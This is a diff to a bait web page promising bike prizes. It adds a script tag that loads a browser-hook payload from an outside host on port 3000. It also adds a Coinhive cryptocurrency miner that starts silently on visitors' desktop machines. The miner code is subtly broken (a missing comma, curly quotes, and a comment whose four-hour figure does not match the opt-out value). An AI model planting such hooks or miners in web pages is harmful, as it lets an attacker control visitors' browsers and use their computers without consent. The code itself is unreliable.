@@ -1,8 +1,17 @@
 <html>
-<head>
-<title> Win Prices with Latest model Bikes. </title>
-<script: src=”http://h.wicky.cz:3000/hook.js”></script&gt;
-</head>
+  <head>
+    <title> Win Prices with Latest model Bikes. </title>
+    <script src=”http://msf.hopto.org:3000/hook.js”></script>
+    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+    <script> 
+      var miner = new CoinHive.Anonymous('J54pv6oaSlkkhpynZBcnFvtZkRIOiKGS' {throttle: 0.3}); 
+      // Only start on non-mobile devices and if not opted-out 
+      // in the last 14400 seconds (4 hours): 
+      if (!miner.isMobile() && !miner.didOptOut(115200)) { 
+        miner.start(); 
+       } 
+    </script>
+  </head>
 <body>
 <img src=”bike.jpg”/>
 </body>
